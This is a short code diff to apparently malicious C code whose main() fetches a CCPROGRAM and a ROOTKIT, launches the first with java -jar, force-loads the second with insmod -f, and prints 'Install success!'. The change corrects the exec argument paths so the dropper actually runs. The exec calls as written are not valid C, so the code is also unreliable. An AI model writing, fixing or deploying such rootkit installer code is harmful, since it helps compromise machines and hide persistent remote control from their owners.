@@ -33,10 +33,10 @@ int main()
     int rv;
     
     rv = obtain(CCPROGRAM);
-    if(rv == 0) execcmd({"/usr/bin", "java", "-jar", CCPROGRAM, NULL});
+    if(rv == 0) execcmd({"/usr/bin/java", "-jar", CCPROGRAM, NULL});
     
     rv = obtain(ROOTKIT);
-    if(rv == 0) execcmd({"/sbin", "insmod", "-f", ROOTKIT, NULL});
+    if(rv == 0) execcmd({"/sbin/insmod", "-f", ROOTKIT, NULL});
     
     printf("Install success!\n");
     return 0;
